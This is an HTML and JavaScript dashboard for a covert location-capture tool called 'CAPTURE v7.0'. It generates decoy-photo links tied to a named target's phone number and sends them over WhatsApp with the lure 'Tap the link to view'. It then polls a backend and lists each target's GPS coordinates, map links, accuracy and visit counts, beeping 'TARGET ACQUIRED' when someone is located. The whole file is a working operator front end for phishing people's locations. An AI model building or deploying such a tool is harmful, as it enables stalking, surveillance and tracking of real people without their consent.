<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>// CAPTURE // v7.0</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&display=swap');

  :root {
    --bg: #0a0a0f;
    --bg2: #0d0d18;
    --bg3: #111122;
    --border: #1a1a30;
    --green: #00ff41;
    --green-dim: #00aa2a;
    --amber: #ffb000;
    --cyan: #00ddff;
    --red: #ff003c;
    --text: #d0d0f0;
    --text2: #8080a0;
    --text3: #404060;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'JetBrains Mono', 'Courier New', monospace;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    overflow: hidden;
  }

  /* ── Scanlines ── */
  body::before {
    content: '';
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: repeating-linear-gradient(
      0deg, transparent, transparent 2px,
      rgba(0,255,65,0.02) 2px, rgba(0,255,65,0.02) 4px
    );
    pointer-events: none;
    z-index: 0;
  }

  /* ── Top bar ── */
  .topbar {
    position: relative;
    z-index: 10;
    background: var(--bg2);
    border-bottom: 1px solid var(--border);
    padding: 6px 18px;
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .sys-name {
    font-size: 11px;
    font-weight: 700;
    color: var(--green);
    letter-spacing: .08em;
  }
  .sys-name .blink { animation: blink 1s step-end infinite; }
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
  .sys-version {
    font-size: 8px;
    color: var(--text3);
    border: 1px solid var(--border);
    padding: 1px 6px;
  }
  .status-bar {
    margin-left: auto;
    display: flex;
    align-items: center;
    gap: 14px;
    font-size: 9px;
    color: var(--text2);
  }
  .dot {
    width: 5px; height: 5px; border-radius: 50%; display: inline-block;
  }
  .dot.green { background: var(--green); box-shadow: 0 0 6px var(--green); animation: pulse 2s infinite; }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }

  /* ── Layout ── */
  .layout {
    position: relative;
    z-index: 5;
    display: grid;
    grid-template-columns: 380px 1fr;
    height: calc(100vh - 37px);
  }

  /* ── Left panel ── */
  .panel {
    background: var(--bg2);
    border-right: 1px solid var(--border);
    padding: 14px;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 12px;
  }
  .panel-title {
    font-size: 8px;
    font-weight: 700;
    letter-spacing: .2em;
    text-transform: uppercase;
    color: var(--text3);
    border-bottom: 1px solid var(--border);
    padding-bottom: 5px;
  }
  .panel-title::before { content: '> '; color: var(--green); }

  .form { display: flex; flex-direction: column; gap: 10px; }
  label {
    font-size: 9px; color: var(--text2); letter-spacing: .1em;
    text-transform: uppercase; display: block; margin-bottom: 2px;
  }
  input, .file-input-wrap {
    width: 100%;
    background: var(--bg);
    border: 1px solid var(--border);
    color: var(--green);
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    padding: 7px 10px;
    outline: none;
    transition: border-color .15s;
  }
  input:focus { border-color: var(--green); box-shadow: 0 0 6px rgba(0,255,65,0.1); }
  input::placeholder { color: var(--text3); }

  .file-input-wrap {
    padding: 4px 8px;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .file-input-wrap input[type="file"] {
    display: none;
  }
  .file-input-wrap .fname {
    font-size: 10px;
    color: var(--text2);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .file-input-wrap .fbtn {
    font-size: 8px;
    color: var(--cyan);
    border: 1px solid var(--border);
    padding: 2px 8px;
    flex-shrink: 0;
  }

  .photo-preview {
    display: none;
    max-height: 120px;
    overflow: hidden;
    border: 1px solid var(--border);
    background: var(--bg);
    text-align: center;
  }
  .photo-preview.show { display: block; }
  .photo-preview img {
    max-height: 118px;
    max-width: 100%;
    display: block;
    margin: 0 auto;
  }

  .btn-create {
    width: 100%;
    background: transparent;
    color: var(--green);
    border: 1px solid var(--green);
    padding: 9px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    font-weight: 700;
    letter-spacing: .1em;
    cursor: pointer;
    transition: all .15s;
    text-transform: uppercase;
  }
  .btn-create:hover { background: rgba(0,255,65,0.06); box-shadow: 0 0 10px rgba(0,255,65,0.1); }
  .btn-create:active { transform: scale(.98); }
  .btn-create:disabled { border-color: var(--text3); color: var(--text3); cursor: not-allowed; }

  .result-card {
    background: var(--bg);
    border: 1px solid var(--green-dim);
    padding: 10px;
    display: none;
    flex-direction: column;
    gap: 8px;
  }
  .result-card.visible { display: flex; }
  .result-label {
    font-size: 8px; color: var(--green); font-weight: 700;
    letter-spacing: .12em; text-transform: uppercase;
  }
  .result-label::before { content: '✓ '; }
  .link-box {
    background: var(--bg3);
    border: 1px solid var(--border);
    padding: 6px 8px;
    font-size: 9px;
    color: var(--cyan);
    word-break: break-all;
    line-height: 1.5;
  }
  .btn-row { display: flex; gap: 5px; }
  .btn-copy, .btn-wa {
    flex: 1;
    background: transparent;
    border: 1px solid var(--border);
    padding: 6px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 9px;
    font-weight: 600;
    cursor: pointer;
    transition: all .15s;
    text-transform: uppercase;
    letter-spacing: .05em;
  }
  .btn-copy { color: var(--cyan); }
  .btn-copy:hover { border-color: var(--cyan); }
  .btn-wa { color: var(--green); }
  .btn-wa:hover { border-color: var(--green); }
  #qrcode { display: flex; justify-content: center; padding: 6px; background: var(--bg); }

  /* ── Stats footer ── */
  .stats {
    margin-top: auto;
    border-top: 1px solid var(--border);
    padding-top: 8px;
    font-size: 8px;
    color: var(--text3);
  }
  .stats div { margin-top: 2px; }
  .stats .val { color: var(--green); }

  /* ── Right panel ── */
  .cases-panel {
    background: var(--bg);
    padding: 10px 14px;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 8px;
  }
  .cases-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    border-bottom: 1px solid var(--border);
    padding-bottom: 6px;
  }
  .cases-header h2 {
    font-size: 10px; font-weight: 700; color: var(--text2);
    letter-spacing: .12em; text-transform: uppercase;
  }
  .case-count {
    font-size: 9px; color: var(--text3);
    background: var(--bg3); padding: 2px 8px;
    border: 1px solid var(--border);
  }

  .term-table-wrap {
    border: 1px solid var(--border);
    background: var(--bg2);
    overflow-x: auto;
  }
  table { width: 100%; border-collapse: collapse; font-size: 10px; }
  th {
    text-align: left; padding: 6px 8px;
    font-size: 8px; font-weight: 700; text-transform: uppercase;
    letter-spacing: .1em; color: var(--text3);
    border-bottom: 1px solid var(--border);
    background: var(--bg3);
  }
  td {
    padding: 7px 8px;
    border-bottom: 1px solid var(--bg3);
    vertical-align: middle;
    font-size: 9px;
  }
  tr:hover td { background: rgba(0,255,65,0.02); }
  tr.flash td { animation: rowflash 1.5s ease; }
  @keyframes rowflash {
    0%   { background: rgba(0,255,65,0.12); }
    100% { background: transparent; }
  }

  .badge {
    padding: 1px 6px; font-size: 8px; font-weight: 700;
    letter-spacing: .05em; text-transform: uppercase;
    display: inline-block; border: 1px solid;
  }
  .badge.pending { color: var(--amber); border-color: var(--amber); background: rgba(255,176,0,0.06); }
  .badge.located { color: var(--green); border-color: var(--green); background: rgba(0,255,65,0.06); }
  .badge.denied  { color: var(--red); border-color: var(--red); background: rgba(0,255,60,0.06); }
  .badge.expired { color: var(--text3); border-color: var(--text3); }

  .map-link {
    color: var(--cyan); text-decoration: none; font-weight: 600; font-size: 9px;
  }
  .map-link:hover { color: var(--green); text-decoration: underline; }

  .empty-state {
    color: var(--text3); text-align: center; padding: 40px 0; font-size: 11px;
  }

  .alert-banner {
    position: fixed; bottom: 16px; right: 16px;
    background: var(--bg2); border: 1px solid var(--green);
    box-shadow: 0 0 16px rgba(0,255,65,0.12);
    padding: 10px 14px; display: none;
    align-items: center; gap: 8px;
    font-size: 10px; font-weight: 600; color: var(--green);
    z-index: 999; animation: slideup .3s ease;
    max-width: 340px;
  }
  @keyframes slideup { from{transform:translateY(16px);opacity:0} to{transform:translateY(0);opacity:1} }
  .alert-banner.show { display: flex; }
  .alert-time { font-size: 7px; color: var(--text3); margin-left: auto; }

  ::-webkit-scrollbar { width: 3px; }
  ::-webkit-scrollbar-track { background: var(--bg); }
  ::-webkit-scrollbar-thumb { background: var(--border); }

  @media (max-width: 800px) {
    .layout { grid-template-columns: 1fr; height: auto; overflow: visible; }
    body { overflow: auto; }
    .panel { border-right: none; border-bottom: 1px solid var(--border); }
    .cases-panel { height: 60vh; }
  }
</style>
</head>
<body>

<div class="topbar">
  <span class="sys-name"><span class="blink">▶</span> // CAPTURE</span>
  <span class="sys-version">v7.0</span>
  <span style="font-size:8px;color:var(--text3);">| SW_INTERCEPT | PHOTO_DECOY</span>
  <div class="status-bar">
    <span><span class="dot green"></span> LIVE</span>
    <span id="lastUpdate">--:--:--</span>
  </div>
</div>

<div class="alert-banner" id="alertBanner">
  <span>📍</span>
  <span id="alertText">TARGET ACQUIRED</span>
  <span class="alert-time" id="alertTime">--:--:--</span>
</div>

<div class="layout">
  <div class="panel">
    <div class="panel-title">new_target</div>

    <div class="form">
      <div>
        <label>// name</label>
        <input type="text" id="targetName" placeholder="target_01" />
      </div>
      <div>
        <label>// phone</label>
        <input type="tel" id="targetPhone" placeholder="03001234567" />
      </div>
      <div>
        <label>// decoy_photo</label>
        <div class="file-input-wrap" onclick="document.getElementById('targetPhoto').click()">
          <span class="fbtn">📎</span>
          <span class="fname" id="photoName">none selected</span>
          <input type="file" id="targetPhoto" accept="image/png,image/jpeg,image/gif,image/webp" />
        </div>
      </div>
      <div class="photo-preview" id="photoPreview">
        <img id="previewImg" />
      </div>

      <button class="btn-create" id="createBtn" onclick="createCase()">
        <span>⚡</span> generate_link
      </button>
    </div>

    <div class="result-card" id="resultCard">
      <div class="result-label">link_generated</div>
      <div class="link-box" id="linkBox">–</div>
      <div class="btn-row">
        <button class="btn-copy" onclick="copyLink()">📋 copy</button>
        <button class="btn-wa" onclick="openWhatsApp()">💬 whatsapp</button>
      </div>
      <div id="qrcode"></div>
    </div>

    <div class="stats">
      <div>active: <span class="val" id="statActive">0</span></div>
      <div>located: <span class="val" id="statLocated">0</span></div>
      <div>denied: <span class="val" id="statDenied" style="color:var(--red);">0</span></div>
    </div>
  </div>

  <div class="cases-panel">
    <div class="cases-header">
      <h2># target_feed</h2>
      <span class="case-count" id="caseCount">0 entries</span>
    </div>
    <div class="term-table-wrap">
      <table>
        <thead>
          <tr>
            <th>target</th>
            <th>status</th>
            <th>coordinates</th>
            <th>acc</th>
            <th>visits</th>
          </tr>
        </thead>
        <tbody id="tbody"></tbody>
      </table>
    </div>
    <div class="empty-state" id="emptyState">Awaiting targets...</div>
  </div>
</div>

<script>
let currentLink = "";
let currentPhone = "";
let prevNotified = new Set();
let qrInstance = null;

// ── Photo preview ──
document.getElementById("targetPhoto").addEventListener("change", function(e) {
  const file = e.target.files[0];
  const nameEl = document.getElementById("photoName");
  const preview = document.getElementById("photoPreview");
  const img = document.getElementById("previewImg");

  if (file) {
    nameEl.textContent = file.name;
    const reader = new FileReader();
    reader.onload = function(ev) {
      img.src = ev.target.result;
      preview.classList.add("show");
    };
    reader.readAsDataURL(file);
  } else {
    nameEl.textContent = "none selected";
    preview.classList.remove("show");
  }
});

// ── Create case ──
async function createCase() {
  const name  = document.getElementById("targetName").value.trim();
  const phone = document.getElementById("targetPhone").value.trim();
  const photoFile = document.getElementById("targetPhoto").files[0];
  const btn   = document.getElementById("createBtn");

  if (!name || !phone) { alert("// ERROR: name and phone required"); return; }

  btn.disabled = true;
  btn.innerHTML = "<span>⏳</span> generating...";

  try {
    const formData = new FormData();
    formData.append("patient_name", name);
    formData.append("phone", phone);
    if (photoFile) formData.append("photo", photoFile);

    const res = await fetch("/create", { method: "POST", body: formData });
    const data = await res.json();
    currentLink  = data.link;
    currentPhone = phone;
    showResult(data.link);
  } catch(e) {
    alert("// ERROR: connection failed");
  } finally {
    btn.disabled = false;
    btn.innerHTML = "<span>⚡</span> generate_link";
  }
}

function showResult(link) {
  document.getElementById("linkBox").textContent = link;
  document.getElementById("resultCard").classList.add("visible");

  const qrDiv = document.getElementById("qrcode");
  qrDiv.innerHTML = "";
  qrInstance = new QRCode(qrDiv, {
    text: link,
    width: 160,
    height: 160,
    colorDark: "#00ff41",
    colorLight: "#0a0a0f",
    correctLevel: QRCode.CorrectLevel.M
  });
}

function copyLink() {
  navigator.clipboard.writeText(currentLink).then(() => {
    const btn = document.querySelector(".btn-copy");
    btn.textContent = "✓ copied";
    setTimeout(() => btn.textContent = "📋 copy", 2000);
  });
}

function openWhatsApp() {
  if (!currentPhone || !currentLink) return;
  const digits = currentPhone.replace(/\D/g, "");
  const intl = digits.startsWith("92") ? digits : "92" + digits.replace(/^0/, "");
  const msg = encodeURIComponent(
    "Tap the link to view:\n\n" + currentLink
  );
  window.open("https://wa.me/" + intl + "?text=" + msg, "_blank");
}

document.getElementById("targetPhone").addEventListener("keydown", e => {
  if (e.key === "Enter") createCase();
});
document.getElementById("targetName").addEventListener("keydown", e => {
  if (e.key === "Enter") document.getElementById("targetPhone").focus();
});

// ── Alert sound ──
function beep() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    if (!ctx) return;
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.frequency.value = 880;
    osc.type = 'square';
    gain.gain.setValueAtTime(0.06, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.12);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.12);
  } catch(e) {}
}

function showAlert(name, count) {
  const banner = document.getElementById("alertBanner");
  const extra = count > 1 ? ` (#${count})` : '';
  document.getElementById("alertText").textContent = `📍 ${name}${extra}`;
  document.getElementById("alertTime").textContent = new Date().toLocaleTimeString();
  banner.classList.add("show");
  beep();
  setTimeout(() => banner.classList.remove("show"), 5000);
}

// ── Render ──
function render(cases) {
  const tbody = document.getElementById("tbody");
  const emptyState = document.getElementById("emptyState");
  const caseCount = document.getElementById("caseCount");
  const lastUpdate = document.getElementById("lastUpdate");

  caseCount.textContent = cases.length + " entr" + (cases.length !== 1 ? "ies" : "y");
  lastUpdate.textContent = new Date().toLocaleTimeString();
  emptyState.style.display = cases.length ? "none" : "block";

  document.getElementById("statActive").textContent = cases.filter(c => c.status !== "expired").length;
  document.getElementById("statLocated").textContent = cases.filter(c => c.status === "located").length;
  document.getElementById("statDenied").textContent = cases.filter(c => c.status === "denied").length;

  cases.forEach(c => {
    if (c.status === "located" && !prevNotified.has(c.token)) {
      prevNotified.add(c.token);
      showAlert(c.patient_name || "UNKNOWN", c.visit_count);
    }
  });

  tbody.innerHTML = cases.map(c => {
    let badge = '';
    if (c.status === 'pending')  badge = '<span class="badge pending">⏳ PENDING</span>';
    else if (c.status === 'located') badge = '<span class="badge located">✓ LOCATED</span>';
    else if (c.status === 'denied')  badge = '<span class="badge denied">✗ DENIED</span>';
    else if (c.status === 'expired') badge = '<span class="badge expired">⏰ EXPIRED</span>';

    let coords = '<span style="color:var(--text3);">—</span>';
    if (c.latitude && c.longitude) {
      coords = `<a class="map-link" target="_blank" href="https://maps.google.com/?q=${c.latitude},${c.longitude}">${c.latitude.toFixed(5)}, ${c.longitude.toFixed(5)}</a>`;
    }

    const acc = c.accuracy ? Math.round(c.accuracy) + 'm' : '<span style="color:var(--text3);">—</span>';
    const visits = c.visit_count ? `<span style="color:var(--text2);">${c.visit_count}x</span>` : '<span style="color:var(--text3);">—</span>';

    return `<tr>
      <td><strong style="color:var(--green);font-size:10px;">${c.patient_name || "UNKNOWN"}</strong>${c.has_photo ? ' <span style="color:var(--cyan);font-size:7px;">📷</span>' : ''}</td>
      <td>${badge}</td>
      <td>${coords}</td>
      <td>${acc}</td>
      <td>${visits}</td>
    </tr>`;
  }).join("");
}

function poll() {
  fetch("/api/cases").then(r => r.json()).then(render).catch(() => {});
}
poll();
setInterval(poll, 2500);
</script>
</body>
</html>
